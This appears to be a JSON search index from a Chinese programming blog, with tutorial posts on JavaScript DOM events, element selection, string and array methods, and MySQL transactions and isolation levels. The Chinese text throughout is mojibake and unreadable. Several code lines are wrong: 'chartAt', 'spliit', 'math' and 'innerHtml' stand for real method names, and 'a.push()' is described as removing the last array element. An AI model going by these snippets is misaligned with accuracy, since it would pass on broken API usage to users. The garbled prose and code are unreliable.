document.querySelector(\"ul\u003eli\") var aaa = ul.children[0] // åˆ›å»ºä¸€ä¸ªæ–°çš„å…ƒç´  var li2 = document.createElement(\"li\") // å¡«å†™å†…å®¹å’Œè¿½åŠ  li2.innerHTML = \"æˆ‘æ˜¯æ’å…¥çš„\" ul.insertBefore(li2,aaa) //////////////////////////////åˆ é™¤èŠ‚ç‚¹////////////////////////////// var btn = document.querySelector(\"button\") btn.onclick = function(){ if (ul.children[1] === undefined){ this.disabled=true } ul.removeChild(ul.children[0]) } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 20:39","objectID":"/post/2007/:0:0","tags":[],"title":"js-æ“ä½œèŠ‚ç‚¹","uri":"/post/2007/"},{"categories":["å‰ç«¯"],"content":"1. åŸºæœ¬äº‹ä»¶ \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"btn\"\u003eç‚¹æˆ‘\u003c/button\u003e \u003cscript\u003e // äº‹ä»¶ä¸‰è¦ç´ ï¼šäº‹ä»¶æºã€è§¦å‘äº‹ä»¶ç±»å‹(å¦‚ä½•è§¦å‘çš„ï¼Œé¼ æ ‡ç‚¹å‡»ã€ç»è¿‡ã€æŒ‰ä¸‹)ã€äº‹ä»¶å¤„ç†ç¨‹åº // 1.è·å–å…ƒç´  var btn = document.getElementById(\"btn\"); // 2.ç»‘å®šäº‹ä»¶ã€‚// 3.äº‹ä»¶å¤„ç†ç¨‹åº btn.onclick = function(e){alert(\"å‰å®³äº†\")} // eä»£è¡¨çš„æ˜¯äº‹ä»¶å¯¹è±¡,å¯ä»¥çœ‹åˆ°äº‹ä»¶çš„è¯¦ç»†ä¿¡æ¯,console.dir(e)å¯ä»¥çœ‹åˆ°æ‰€æœ‰å±æ€§ \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e å¸¸è§é¼ æ ‡äº‹ä»¶ onclick é¼ æ ‡ç‚¹å‡»å·¦é”®è§¦å‘ onmouseover é¼ æ ‡ç»è¿‡è§¦å‘ onmouseout é¼ æ ‡ç¦»å¼€è§¦å‘ onfocus è·å¾—é¼ æ ‡ç„¦ç‚¹è§¦å‘ onblur å¤±å»é¼ æ ‡ç„¦ç‚¹è§¦å‘ onmousemove é¼ æ ‡ç§»åŠ¨è§¦å‘ onmouseup é¼ æ ‡æ¾å¼€è§¦å‘ onmousedown é¼ æ ‡æŒ‰ä¸‹è§¦å‘ ","date":"2020-09-28 15:39","objectID":"/post/2006/:1:0","tags":["javascript"],"title":"js-äº‹ä»¶","uri":"/post/2006/"},{"categories":["å‰ç«¯"],"content":"2.äº‹ä»¶ä¾¦å¬å™¨ \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"btn\"\u003eç›‘å¬äº‹ä»¶\u003c/button\u003e \u003cscript\u003e // æ³¨å†Œæ—¶é—´çš„ä¸¤ç§æ–¹å¼ // ä¼ ç»Ÿæ³¨å†Œæ–¹å¼ï¼šåŒä¸€ä¸ªå…ƒç´ åŒä¸€ä¸ªäº‹ä»¶åªèƒ½è®¾ç½®ä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œæœ€åç»‘å®šçš„å¤„ç†å‡½æ•°ä¼šè¦†ç›–å‰é¢æ³¨å†Œçš„ // æ–¹æ³•ç›‘å¬æ–¹å¼ï¼šaddEventListener()æ–¹æ³•å‘æŒ‡å®šå…ƒç´ æ·»åŠ äº‹ä»¶å¥æŸ„ã€‚IE9ä¹‹å‰ç”¨attachEvent(). // åŒä¸€ä¸ªå…ƒç´ åŒä¸€ä¸ªäº‹ä»¶å¯ä»¥æ³¨å†Œå¤šä¸ªäº‹ä»¶ä¾¦å¬å™¨ï¼ŒæŒ‰æ³¨å†Œé¡ºåºæ‰§è¡Œ // æ·»åŠ äº‹ä»¶ä¾¦å¬å™¨ // è·å–æŒ‰é’®å…ƒç´  var btn = document.querySelector(\"#btn\") // 1. ç›‘å¬äº‹ä»¶ç±»å‹ ä¸å¸¦on // 2. ä¸‹é¢çš„ç¤ºä¾‹ä¸­æ»¡è¶³ åŒä¸€ä¸ªå…ƒç´ (btn)ã€åŒä¸€ä¸ªäº‹ä»¶(click)æ·»åŠ å¤šä¸ªä¾¦å¬å™¨ btn.addEventListener(\"click\", e1) function e1(){ alert(\"æˆ‘æ˜¯ç¬¬ä¸€ä¸ªclickäº‹ä»¶\") // åˆ é™¤äº‹ä»¶,ä½¿ç”¨åŒ¿åå‡½æ•°åˆ™æ— æ³•åˆ é™¤ btn.removeEventListener(\"click\",e1) } btn.addEventListener(\"click\",function(){alert(\"æˆ‘æ˜¯ç¬¬äºŒä¸ªclickäº‹ä»¶\")}) \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 15:39","objectID":"/post/2006/:2:0","tags":["javascript"],"title":"js-äº‹ä»¶","uri":"/post/2006/"},{"categories":["å‰ç«¯"],"content":"3.DOMäº‹ä»¶æµ äº‹ä»¶å‘ç”Ÿæ—¶ä¼šåœ¨å…ƒç´ èŠ‚ç‚¹ä¹‹é—´æŒ‰ç…§ç‰¹å®šçš„é¡ºåºä¼ æ’­ï¼Œè¿™ä¸ªä¼ æ’­è¿‡ç¨‹å°±æ˜¯DOMäº‹ä»¶æµ æ¯”å¦‚æˆ‘ä»¬ç»™ä¸€ä¸ªdivæ³¨å†Œäº†ç‚¹å‡»äº‹ä»¶,ä¼šæŒ‰ç…§ä¸‹é¢çš„é¡ºåºæ‰§è¡Œ: æ•è·é˜¶æ®µ: Documentâ€“\u003eelement htmlâ€“\u003eelement bodyâ€“\u003eelement div å½“å‰ç›®æ ‡é˜¶æ®µ: element div å†’æ³¡é˜¶æ®µ: element divâ€“\u003eDocumentâ€“\u003eelement htmlâ€“\u003eelement body JSä»£ç åªä¼šæ‰§è¡Œæ•è·é˜¶æ®µå’Œå†’æ³¡é˜¶æ®µå…¶ä¸­ä¸€ä¸ª addEventListeneræ–¹æ³•çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºfalseå°±æ˜¯å†’æ³¡é˜¶æ®µï¼Œä¸ºtrueå°±æ˜¯æ•è·é˜¶æ®µ onclickå’ŒattachEventåªèƒ½çš„åˆ°å†’æ³¡é˜¶æ®µ æœ‰äº›äº‹ä»¶æ²¡æœ‰å†’æ³¡noblurã€onfocusã€onmouseenterã€onmouseleave ä¸‹é¢æ˜¯å†’æ³¡é˜¶æ®µç¤ºä¾‹ï¼Œå½“ç‚¹å‡»sonç›’å­çš„æ—¶å€™ï¼Œparentã€htmlå’Œdocumentä¹Ÿä¼šä¾æ¬¡è§¦å‘ç›¸åº”äº‹ä»¶ \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003cstyle\u003e .parent { overflow: hidden; height: 400px; width: 400px; margin: 100px auto; background-color: skyblue; } .son { margin: 125px auto; height: 150px; width: 150px; background-color: red; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"parent\"\u003e \u003cdiv class=\"son\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cscript\u003e // sonç»‘å®šäº‹ä»¶ var son = document.querySelector('.son') son.addEventListener('click',function(e){ alert(\"son\") }) //parentç»‘å®šäº‹ä»¶ var parent = document.querySelector('.parent') parent.addEventListener('click',function(e){ alert(\"parent\") }) //documentç»‘å®šäº‹ä»¶ document.addEventListener('click',function(e){ alert(\"document\") }) //htmlç»‘å®šäº‹ä»¶ var html = document.querySelector('html') html.addEventListener('click',function(e){ alert(\"html\") }) \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 15:39","objectID":"/post/2006/:3:0","tags":["javascript"],"title":"js-äº‹ä»¶","uri":"/post/2006/"},{"categories":["å‰ç«¯"],"content":"4.é˜»æ­¢å†’æ³¡,æˆ‘ä»¬åœ¨sonçš„äº‹ä»¶å¤„ç†ç¨‹åºä¸­æ·»åŠ e.stopPropagation();å°±ä¸ä¼šè§¦å‘å…¶ä»–å…ƒç´ çš„äº‹ä»¶äº† \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003cstyle\u003e .parent { overflow: hidden; height: 400px; width: 400px; margin: 100px auto; background-color: skyblue; } .son { margin: 125px auto; height: 150px; width: 150px; background-color: red; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"parent\"\u003e \u003cdiv class=\"son\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cscript\u003e // sonç»‘å®šäº‹ä»¶ var son = document.querySelector('.son') son.addEventListener('click',function(e){ alert(\"son\") e.stopPropagation(); }) //parentç»‘å®šäº‹ä»¶ var parent = document.querySelector('.parent') parent.addEventListener('click',function(e){ alert(\"parent\") }) //documentç»‘å®šäº‹ä»¶ document.addEventListener('click',function(e){ alert(\"document\") }) //htmlç»‘å®šäº‹ä»¶ var html = document.querySelector('html') html.addEventListener('click',function(e){ alert(\"html\") }) \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 15:39","objectID":"/post/2006/:4:0","tags":["javascript"],"title":"js-äº‹ä»¶","uri":"/post/2006/"},{"categories":["å‰ç«¯"],"content":"5.äº‹ä»¶å§”æ‰˜ \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003cstyle\u003e li { width: 50px; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cul\u003e \u003cli\u003eæˆ‘æ˜¯11\u003c/li\u003e \u003cli\u003eæˆ‘æ˜¯12\u003c/li\u003e \u003cli\u003eæˆ‘æ˜¯13\u003c/li\u003e \u003cli\u003eæˆ‘æ˜¯14\u003c/li\u003e \u003cli\u003eæˆ‘æ˜¯15\u003c/li\u003e \u003c/ul\u003e \u003cscript\u003e // äº‹ä»¶å§”æ‰˜çš„æ ¸å¿ƒåŸç†: ç»™çˆ¶èŠ‚ç‚¹æ·»åŠ ä¾¦å¬å™¨ï¼Œåˆ©ç”¨äº‹ä»¶å†’æ³¡å½±å“æ¯ä¸€ä¸ªå­èŠ‚ç‚¹ var ul = document.querySelector(\"ul\") ul.addEventListener('click',function(e){ console.dir(e) alert(e.target.innerText); // æ’ä»–æ€æƒ³ï¼Œå°†å…¶ä»–æ ‡ç­¾é¢œè‰²è®¾ç½®ä¸ºç©º for (var i=0;i\u003cul.childElementCount;i++){ ul.children[i].style.backgroundColor = \"\" } e.target.style.backgroundColor = \"skyblue\" }) \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 15:39","objectID":"/post/2006/:5:0","tags":["javascript"],"title":"js-äº‹ä»¶","uri":"/post/2006/"},{"categories":["å‰ç«¯"],"content":"1.è·å–å…ƒç´  \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"i1\"\u003eok\u003c/div\u003e \u003cdiv id=\"i2\"\u003efuck\u003c/div\u003e \u003cul\u003e \u003cli\u003e1\u003c/li\u003e \u003cli\u003e2\u003c/li\u003e \u003cli\u003e3\u003c/li\u003e \u003cli\u003e4\u003c/li\u003e \u003cli name='1'\u003e5\u003c/li\u003e \u003c/ul\u003e \u003cdiv class=\"box\"\u003eç›’å­1\u003c/div\u003e \u003cdiv class=\"box\"\u003eç›’å­2\u003c/div\u003e \u003cscript\u003e // æ ¹æ®idè·å– console.log(document.getElementById(\"i1\")); //æ ¹æ®æ ‡ç­¾è·å–,è¿”å›æ•°ç»„ console.log(document.getElementsByTagName(\"li\")); //æ ¹æ®nameå±æ€§è·å–,è¿”å›æ•°ç»„ console.log(document.getElementsByName(\"1\")[0].innerText) // h5æ–°å¢ //æ ¹æ®classåè·å– console.log(document.getElementsByClassName(\"box\")); //æŒ‡å®šä¸€ä¸ªé€‰æ‹©å™¨,è¿”å›ç¬¬ä¸€ä¸ªå…ƒç´ å¯¹è±¡ console.log(document.querySelector(\".box\")) console.log(document.querySelector(\"#i2\")) //æŒ‡å®šä¸€ä¸ªé€‰æ‹©å™¨,è¿”å›æ‰€æœ‰å…ƒç´ å¯¹è±¡ console.log(document.querySelectorAll(\".box\")); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 2.æ“ä½œæ ‡ç­¾ tags = document.getElementsByTagName(â€œdivâ€) tags[0].innerText = \"xxx\" tags[0].innerHtml = \"\u003cp\u003exxx\u003c/p\u003e\" tags[0].style.color = \"skyblue\" ","date":"2020-09-24 17:14","objectID":"/post/2001/:0:0","tags":["javascript"],"title":"js-è·å–æ“ä½œå…ƒç´ ","uri":"/post/2001/"},{"categories":["å‰ç«¯"],"content":"åŸºæœ¬æ•°æ®ç±»å‹ï¼š ","date":"2020-09-24 16:31","objectID":"/post/2000/:1:0","tags":["javascript"],"title":"js-åŸºæœ¬æ“ä½œ","uri":"/post/2000/"},{"categories":["å‰ç«¯"],"content":"1.æ•°å€¼ï¼š a = 18; ","date":"2020-09-24 16:31","objectID":"/post/2000/:1:1","tags":["javascript"],"title":"js-åŸºæœ¬æ“ä½œ","uri":"/post/2000/"},{"categories":["å‰ç«¯"],"content":"2.å­—ç¬¦ä¸²ï¼š https://www.w3school.com.cn/jsref/jsref_obj_string.asp a = 'soulchild' a.chartAt(ç´¢å¼•ä½ç½®) a.substring(èµ·å§‹ä½ç½®,ç»“æŸä½ç½®) a.length è·å–å­—ç¬¦ä¸²é•¿åº¦ a.indexOf('x') æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸‹æ ‡,ç¬¬ä¸€æ¬¡å‡ºç°ä½ç½® a.lastIndexOf(\"x\") æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸‹æ ‡,æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½® a.slice() åˆ‡ç‰‡ a.toLowerCase() è½¬æ¢ä¸ºå°å†™ a.toUpperCase() è½¬æ¢ä¸ºå¤§å†™ a.spliit() åˆ†å‰² a.math() æ­£åˆ™åŒ¹é… ","date":"2020-09-24 16:31","objectID":"/post/2000/:1:2","tags":["javascript"],"title":"js-åŸºæœ¬æ“ä½œ","uri":"/post/2000/"},{"categories":["å‰ç«¯"],"content":"3.æ•°ç»„ https://www.w3school.com.cn/jsref/jsref_obj_array.asp a = [1,2,3,4,5] a.push(6) å°¾éƒ¨è¿½åŠ å…ƒç´  a.push() åˆ é™¤å¹¶è¿”å›æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´  a.unshift(123) é¦–éƒ¨è¿½åŠ å…ƒç´  a.shift() åˆ é™¤å¹¶è¿”å›æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  a.splice(start,delcount,values) ä»ç¬¬startä¸ªå…ƒç´ å¼€å§‹,åˆ é™¤delcountæ¬¡å…ƒç´ ã€‚valuesä»£è¡¨è¦æ’å…¥çš„å€¼ forå¾ªç¯ #1 a = [11,22,33,44] for (var i in a){ console.log(a[i]) } #2 for (var i=0;i\u003c10;i++){ console.log(i) } åˆ¤æ–­ if (æ¡ä»¶){ // ä»£ç å— }else if (){ // ä»£ç å— }else{ // ä»£ç å— } ==ï¼š å€¼ç›¸ç­‰ ===ï¼š å€¼å’Œç±»å‹éƒ½ç›¸ç­‰ \u0026\u0026ï¼š and ||ï¼š or å®šæ—¶å™¨ï¼š // 2ç§’è¿è¡Œä¸€æ¬¡ setInterval(\"æ‰§è¡Œä»£ç \",æ—¶é—´é—´éš”) å‡½æ•°ï¼š function å‡½æ•°å(c1,c2,c3){ // ä»£ç å— } ","date":"2020-09-24 16:31","objectID":"/post/2000/:1:3","tags":["javascript"],"title":"js-åŸºæœ¬æ“ä½œ","uri":"/post/2000/"},{"categories":["databases"],"content":" 1. äº‹åŠ¡çš„åŸºæœ¬ä»‹ç» 1. æ¦‚å¿µï¼š * å¦‚æœä¸€ä¸ªåŒ…å«å¤šä¸ªæ­¥éª¤çš„ä¸šåŠ¡æ“ä½œï¼Œè¢«äº‹åŠ¡ç®¡ç†ï¼Œé‚£ä¹ˆè¿™äº›æ“ä½œè¦ä¹ˆåŒæ—¶æˆåŠŸï¼Œè¦ä¹ˆåŒæ—¶å¤±è´¥ã€‚ 2. æ“ä½œï¼š 1. å¼€å¯äº‹åŠ¡ï¼š start transaction; 2. å›æ»šï¼šrollback; 3. æäº¤ï¼šcommit; 3. ä¾‹å­ï¼š CREATE TABLE account ( id INT PRIMARY KEY AUTO_INCREMENT, NAME VARCHAR(10), balance DOUBLE ); -- æ·»åŠ æ•°æ® INSERT INTO account (NAME, balance) VALUES ('zhangsan', 1000), ('lisi', 1000); SELECT * FROM account; UPDATE account SET balance = 1000; -- å¼ ä¸‰ç»™æå››è½¬è´¦ 500 å…ƒ -- 0. å¼€å¯äº‹åŠ¡ START TRANSACTION; -- 1. å¼ ä¸‰è´¦æˆ· -500 UPDATE account SET balance = balance - 500 WHERE NAME = 'zhangsan'; -- 2. æå››è´¦æˆ· +500 -- å‡ºé”™äº†... UPDATE account SET balance = balance + 500 WHERE NAME = 'lisi'; -- å‘ç°æ‰§è¡Œæ²¡æœ‰é—®é¢˜ï¼Œæäº¤äº‹åŠ¡ COMMIT; -- å‘ç°å‡ºé—®é¢˜äº†ï¼Œå›æ»šäº‹åŠ¡ ROLLBACK; 4. MySQLæ•°æ®åº“ä¸­äº‹åŠ¡é»˜è®¤è‡ªåŠ¨æäº¤ * äº‹åŠ¡æäº¤çš„ä¸¤ç§æ–¹å¼ï¼š * è‡ªåŠ¨æäº¤ï¼š * mysqlå°±æ˜¯è‡ªåŠ¨æäº¤çš„ * ä¸€æ¡DML(å¢åˆ æ”¹)è¯­å¥ä¼šè‡ªåŠ¨æäº¤ä¸€æ¬¡äº‹åŠ¡ã€‚ * æ‰‹åŠ¨æäº¤ï¼š * Oracle æ•°æ®åº“é»˜è®¤æ˜¯æ‰‹åŠ¨æäº¤äº‹åŠ¡ * éœ€è¦å…ˆå¼€å¯äº‹åŠ¡ï¼Œå†æäº¤ * ä¿®æ”¹äº‹åŠ¡çš„é»˜è®¤æäº¤æ–¹å¼ï¼š * æŸ¥çœ‹äº‹åŠ¡çš„é»˜è®¤æäº¤æ–¹å¼ï¼šSELECT @@autocommit; -- 1 ä»£è¡¨è‡ªåŠ¨æäº¤ 0 ä»£è¡¨æ‰‹åŠ¨æäº¤ * ä¿®æ”¹é»˜è®¤æäº¤æ–¹å¼ï¼š set @@autocommit = 0; 2. äº‹åŠ¡çš„å››å¤§ç‰¹å¾ï¼š 1. åŸå­æ€§ï¼šæ˜¯ä¸å¯åˆ†å‰²çš„æœ€å°æ“ä½œå•ä½ï¼Œè¦ä¹ˆåŒæ—¶æˆåŠŸï¼Œè¦ä¹ˆåŒæ—¶å¤±è´¥ã€‚ 2. æŒä¹…æ€§ï¼šå½“äº‹åŠ¡æäº¤æˆ–å›æ»šå,å³äº‹åŠ¡ç»“æŸå,æ•°æ®ä¼šæŒä¹…åŒ–ä¿å­˜ã€‚ 3. éš”ç¦»æ€§ï¼šå¤šä¸ªäº‹åŠ¡ä¹‹é—´ã€‚ç›¸äº’ç‹¬ç«‹ã€‚ 4. ä¸€è‡´æ€§ï¼šäº‹åŠ¡æ“ä½œå‰åï¼Œæ•°æ®æ€»é‡ä¸å˜ 3. äº‹åŠ¡çš„éš”ç¦»çº§åˆ«ï¼ˆäº†è§£ï¼‰ * æ¦‚å¿µï¼šå¤šä¸ªäº‹åŠ¡ä¹‹é—´éš”ç¦»çš„ï¼Œç›¸äº’ç‹¬ç«‹çš„ã€‚ä½†æ˜¯å¦‚æœå¤šä¸ªäº‹åŠ¡æ“ä½œåŒä¸€æ‰¹æ•°æ®ï¼Œåˆ™ä¼šå¼•å‘ä¸€äº›é—®é¢˜ï¼Œè®¾ç½®ä¸åŒçš„éš”ç¦»çº§åˆ«å°±å¯ä»¥è§£å†³è¿™äº›é—®é¢˜ã€‚ * å­˜åœ¨é—®é¢˜ï¼š 1. è„è¯»ï¼šä¸€ä¸ªäº‹åŠ¡ï¼Œè¯»å–åˆ°å¦ä¸€ä¸ªäº‹åŠ¡ä¸­æ²¡æœ‰æäº¤çš„æ•°æ® 2. ä¸å¯é‡å¤è¯»ï¼šåœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œä¸¤æ¬¡è¯»å–åˆ°çš„æ•°æ®ä¸ä¸€æ ·ã€‚å¯èƒ½è¢«å¦ä¸€ä¸ªäº‹åŠ¡æ›´æ”¹ï¼Œæäº¤ã€å›æ»š 3. å¹»è¯»ï¼šä¸€ä¸ªäº‹åŠ¡,æ“ä½œ(DML)æ•°æ®è¡¨ä¸­æ‰€æœ‰è®°å½•ï¼Œå¦ä¸€ä¸ªäº‹åŠ¡æ·»åŠ äº†ä¸€æ¡æ•°æ®ï¼Œåˆ™ç¬¬ä¸€ä¸ªäº‹åŠ¡æŸ¥è¯¢ä¸åˆ°è‡ªå·±çš„ä¿®æ”¹ã€‚ * éš”ç¦»çº§åˆ«ï¼š 1. read uncommittedï¼šå¯ä»¥è¯»å–æœªæäº¤çš„æ•°æ® * äº§ç”Ÿçš„é—®é¢˜ï¼šè„è¯»ã€ä¸å¯é‡å¤è¯»ã€å¹»è¯» 2. read committedï¼šå¯ä»¥è¯»å–å·²æäº¤çš„æ•°æ®ï¼ˆOracleé»˜è®¤ï¼‰ * äº§ç”Ÿçš„é—®é¢˜ï¼šä¸å¯é‡å¤è¯»ã€å¹»è¯» 3. repeatable readï¼šå¯é‡å¤è¯» ï¼ˆMySQLé»˜è®¤ï¼‰ * äº§ç”Ÿçš„é—®é¢˜ï¼šå¹»è¯» 4. serializableï¼šä¸²è¡ŒåŒ– * å¯ä»¥è§£å†³æ‰€æœ‰çš„é—®é¢˜ * æ³¨æ„ï¼šéš”ç¦»çº§åˆ«ä»å°åˆ°å¤§å®‰å…¨æ€§è¶Šæ¥è¶Šé«˜ï¼Œä½†æ˜¯æ•ˆç‡è¶Šæ¥è¶Šä½ * æ•°æ®åº“æŸ¥è¯¢éš”ç¦»çº§åˆ«ï¼š * select @@tx_isolation; * æ•°æ®åº“è®¾ç½®éš”ç¦»çº§åˆ«ï¼š * set global transaction isolation level çº§åˆ«å­—ç¬¦ä¸²; ","date":"2020-09-23 10:00","objectID":"/post/1997/:0:0","tags":["mysql"],"title":"mysqläº‹åŠ¡","uri":"/post/1997/"},{"categories":["databases"],"content":"æ¼”ç¤ºä¸åŒçº§åˆ«äº§ç”Ÿçš„é—®é¢˜ï¼š åœ¨è®¾ç½®å®Œäº‹åŠ¡çº§åˆ«å,åœ¨ä¸¤ä¸ªçª—å£éƒ½éœ€è¦æ‰§è¡Œstart transaction; read uncommittedï¼š set global transaction isolation level read uncommitted; start transaction; -- è½¬è´¦æ“ä½œ update account set balance = balance - 500 where id = 1; update account set balance = balance + 500 where id = 2; -- æ­¤æ—¶äº‹åŠ¡å¹¶æ²¡æœ‰æäº¤ï¼Œä½†æ˜¯æ‰“å¼€å¦ä¸€ä¸ªçª—å£æŸ¥è¯¢,å¯ä»¥æŸ¥è¯¢åˆ°æœªæäº¤çš„ä¿®æ”¹ã€‚å³è„è¯» -- å½“è¿™ä¸ªäº‹åŠ¡æ‰§è¡Œrollbackå,å¦ä¸€ä¸ªå†æ¬¡çª—å£æŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„ç»“æœåˆå˜æˆæœ€åŸå§‹çš„æ•°æ®ã€‚åŒä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œä¸¤æ¬¡æŸ¥è¯¢ç»“æœä¸ä¸€æ ·ã€‚å³ä¸å¯é‡å¤è¯» read committedï¼š set global transaction isolation level read committed; start transaction; -- è½¬è´¦æ“ä½œ update account set balance = balance - 500 where id = 1; update account set balance = balance + 500 where id = 2; -- å½“è¿™ä¸ªäº‹åŠ¡æ‰§è¡Œcommitå‰ï¼Œå¦ä¸€ä¸ªçª—å£æŸ¥è¯¢,æŸ¥è¯¢ä¸åˆ°ä¿®æ”¹çš„æ•°æ®ã€‚è§£å†³è„è¯» -- æ‰§è¡Œcommitåï¼Œå¦ä¸€ä¸ªçª—å£å†æ¬¡æŸ¥è¯¢ï¼ŒæŸ¥è¯¢åˆ°ä¿®æ”¹åçš„ç»“æœã€‚åŒä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œä¸¤æ¬¡æŸ¥è¯¢ç»“æœä¸ä¸€æ ·ã€‚å³ä¸å¯é‡å¤è¯» repeatable readï¼š set global transaction isolation level repeatable read; start transaction; -- è½¬è´¦æ“ä½œ update account set balance = balance - 500 where id = 1; update account set balance = balance + 500 where id = 2; -- å½“è¿™ä¸ªäº‹åŠ¡æ‰§è¡Œcommitå‰ï¼Œå¦ä¸€ä¸ªçª—å£æŸ¥è¯¢,æŸ¥è¯¢ä¸åˆ°ä¿®æ”¹çš„æ•°æ®ã€‚è§£å†³è„è¯» -- å½“è¿™ä¸ªäº‹åŠ¡æ‰§è¡Œcommitåï¼Œå¦ä¸€ä¸ªçª—å£æŸ¥è¯¢,æŸ¥è¯¢ä¸åˆ°ä¿®æ”¹çš„æ•°æ®ã€‚è§£å†³ä¸å¯é‡å¤è¯» serializableï¼š set global transaction isolation level serializable; start transaction; -- è½¬è´¦æ“ä½œ update account set balance = balance - 500 where id = 1; update account set balance = balance + 500 where id = 2; -- å½“ç¬¬ä¸€ä¸ªäº‹åŠ¡æ²¡æœ‰ç»“æŸæ—¶ï¼Œå¦ä¸€ä¸ª\"äº‹åŠ¡\"çš„æ“ä½œä¼šè¢«é˜»å¡ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªäº‹åŠ¡ç»“æŸ æ³¨æ„ä¸Šé¢çš„æµ‹è¯•ä¸­ç¬¬äºŒä¸ªçª—å£åœ¨æŸ¥è¯¢ä¹‹å‰å…ˆå¼€å¯äº‹åŠ¡ ","date":"2020-09-23 10:00","objectID":"/post/1997/:0:1","tags":["mysql"],"title":"mysqläº‹åŠ¡","uri":"/post/1997/"},{"categories":["databases"],"content":" -- å­¦ç”Ÿè¡¨ create table `student` ( `id` int unsigned PRIMARY KEY auto_increment, `name` char(32) not null unique, `sex` enum('ç”·','å¥³') not null, `city` char(32) not null, `description` text, `birthday` date not null default '1995-1-1', `money` float(7,2) default 0, `only_child` boolean )charset=utf8mb4; -- å­¦ç”Ÿæ•°æ® insert into `student` (`name`,`sex`,`city`,`description`,`birthday`,`money`,`only_child`) VALUES ('éƒ­å¾·çº²', 'ç”·','åŒ—äº¬','ç­é•¿','1997/10/1',rand()*100,True), ('é™ˆä¹”æ©', 'å¥³', 'ä¸Šæµ·', NULL, '1995/3/2', rand() * 100,True), ('èµµä¸½é¢–', 'å¥³', 'åŒ—äº¬', 'ç­èŠ±, ä¸éª„å‚²', '1995/4/4', rand()* 100, False), ('ç‹å®å¼º', 'ç”·', 'é‡åº†', 'è¶…çˆ±åƒç«é”…', '1998/10/5', rand() *100, False), ('èµµé›…èŠ', 'å¥³', 'é‡åº†', 'å…¨å®‡å®™ä¸‰å¥½å­¦ç”Ÿ', '1996/7/9',rand() * 100, True), ('å¼ å­¦å‹', 'ç”·', 'ä¸Šæµ·', 'å¥¥æ—åŒ¹å…‹æ€»å† å†›ï¼', '1993/5/2',rand() * 100, False), ('é™ˆæ„æ¶µ', 'å¥³', 'ä¸Šæµ·', NULL, '1994/8/30', rand() * 100,True), ('èµµæœ¬å±±', 'ç”·', 'å—äº¬', 'å‰¯ç­é•¿', '1995/6/1', rand() *100, True), ('å¼ æŸèŠ', 'å¥³', 'ä¸Šæµ·', NULL, '1997/2/28', rand() * 100,False), ('å´äº¦å‡¡', 'ç”·', 'å—äº¬', 'å¤§ç¢—å®½é¢è¦ä¸è¦ï¼Ÿ', '1995/6/1', rand() * 100, True), ('é¹¿æ™—', 'ç”·', 'åŒ—äº¬', NULL, '1993/5/28', rand() * 100,True), ('å…³æ™“å½¤', 'å¥³', 'åŒ—äº¬', NULL, '1995/7/12', rand() * 100,True), ('å‘¨æ°ä¼¦', 'ç”·', 'å°åŒ—', 'å°ä¼™äººæ‰å•Š', '1998/3/28', rand() *100, False), ('é©¬äº‘', 'ç”·', 'å—äº¬', 'ä¸€ä¸ªå­—ï¼šè´¼æœ‰é’±', '1990/4/1', rand()* 100, False), ('é©¬åŒ–è…¾', 'ç”·', 'ä¸Šæµ·', 'é©¬äº‘æ­»å¯¹å¤´', '1990/11/28', rand()* 100, False); æˆç»©è¡¨ create table score ( `id` int unsigned primary key auto_increment, `math` float not null default 0, `english` float not null default 0 )charset=utf8mb4; insert into score (`math`, `english`) values (49, 71), (62, 66.7), 